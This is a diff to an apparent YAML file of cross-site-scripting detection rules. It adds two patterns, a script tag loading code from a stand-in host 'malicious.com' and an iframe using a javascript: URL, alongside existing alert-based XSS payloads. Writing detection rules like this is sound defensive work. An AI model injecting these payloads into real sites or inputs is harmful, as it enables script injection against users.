@@ -11,6 +11,8 @@ xss_detection_rules:
       - "<svg><script>alert('XSS')</script></svg>"
       - "<script>document.write('<img src=x onerror=alert(1)>')</script>"
       - "<svg/onload=alert('XSS')>"
+      - "<script src='http://malicious.com/xss.js'></script>"
+      - "<iframe src='javascript:alert(1)'></iframe>"
 
   - name: "Attribute-Based XSS"
     patterns:
